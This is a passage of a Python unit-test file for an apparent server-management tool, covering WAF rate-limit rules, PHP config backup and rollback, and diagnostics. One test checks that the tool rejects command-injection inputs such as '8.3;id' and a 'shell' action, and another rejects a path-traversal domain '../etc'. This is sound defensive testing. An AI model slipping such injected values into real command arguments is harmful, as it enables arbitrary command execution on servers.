        self.assertIn('deny,status:429', rules)
        self.assertIn('initcol:ip=%{REMOTE_ADDR}', rules)
        self.assertEqual(rules.count('expirevar:'), 1)
        self.assertNotIn('deny', m.waf_rules('example.com', 'detect', 120))
        self.assertEqual(m.waf_rules('example.com', 'off', 120), '')
        for domain, mode, limit in [('../etc', 'detect', 120), ('example.com', 'root', 120), ('example.com', 'detect', 0)]:
            with self.assertRaises(ValueError):
                m.waf_rules(domain, mode, limit)

    def test_php_backup_and_rollback_check_current_hash(self):
        php = self.base / 'php/8.3'
        (php / 'etc').mkdir(parents=True)
        ini = php / 'etc/php.ini'
        ini.write_bytes(b'old config')
        with mock.patch.object(m, 'handler', return_value=php), mock.patch.object(m, 'reload_handler') as reload:
            backup = m.php_backup('8.3')
            ini.write_bytes(b'new config')
            with self.assertRaises(ValueError):
                m.php_restore('8.3', backup['id'], '0' * 64)
            m.php_restore('8.3', backup['id'], m.digest(b'new config'))
            self.assertEqual(ini.read_bytes(), b'old config')
            reload.assert_called_once_with('8.3')

    def test_runtime_failed_reload_restores_original_config(self):
        php = self.base / 'php/8.3'
        (php / 'etc').mkdir(parents=True)
        ini = php / 'etc/php.ini'
        original = (m.BEGIN + 'extension=snuffleupagus.so\n' + m.END).encode()
        ini.write_bytes(original)
        with mock.patch.object(m, 'handler', return_value=php), \
             mock.patch.object(m, 'reload_handler', side_effect=[ValueError('failed'), None]):
            with self.assertRaises(ValueError):
                m.runtime_set('8.3', 'off', m.digest(original))
        self.assertEqual(ini.read_bytes(), original)

    def test_unknown_action_and_shell_injection_rejected(self):
        with self.assertRaises(ValueError):
            m.dispatch({'action': 'shell', 'command': 'id'})
        with self.assertRaises(ValueError):
            m.handler('8.3;id')
        with self.assertRaises(ValueError):
            m.repair_rollback('a' * 32, -1)

    def test_diagnostics_contains_checks_not_keys(self):
        with mock.patch.object(m, 'run', return_value='TEST'), \
             mock.patch.object(m.h, 'fail2ban_status', return_value={}), \
             mock.patch.object(m.h, 'waf_status', return_value={'available': False}), \
             mock.patch.object(m.h, 'monitor_status', return_value=[]):
            result = m.diagnostics('example.com')
        self.assertEqual(len(result['checks']), 6)
        self.assertTrue(all(check['ok'] for check in result['checks']))


if __name__ == '__main__':
    unittest.main()
